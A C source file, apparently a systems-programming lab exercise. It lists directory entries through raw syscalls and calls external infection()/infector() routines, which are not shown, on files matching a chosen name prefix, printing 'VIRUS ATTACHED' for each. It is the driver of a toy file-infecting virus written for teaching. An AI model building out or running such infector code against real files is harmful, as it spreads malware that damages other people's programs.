#include "util.h"

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define O_RDONLY 0
#define STDOUT 1
#define BUF_SIZE 8192

extern int system_call();
extern void infection();
extern void infector(char *filename);

int main(int argc, char *argv[]) {
    int fd, readed_bytes;
    char buf[BUF_SIZE];
    int current_index;
    char prefix = '\0';
    int should_filter = 0;
    int i;

    for (i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'a') {
            should_filter = 1;
            prefix = argv[i][2];
        }
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    readed_bytes = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (readed_bytes < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    current_index = 0;
    while (current_index < readed_bytes) {
        short file_length = *(short*)(buf + current_index + 8);
        char *file_name = (char*)(buf + current_index + 10);
        int same_prefix = 0;

        if (should_filter && file_name[0] == prefix) {
            same_prefix = 1;
        }

        if (same_prefix) {
            infection();
            infector(file_name);
        }

        system_call(SYS_WRITE, STDOUT, file_name, strlen(file_name));

        if (same_prefix) {
            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
        }

        system_call(SYS_WRITE, STDOUT, "\n", 1);

        current_index += file_length;
    }

    system_call(SYS_CLOSE, fd, 0, 0);

    return 0;
}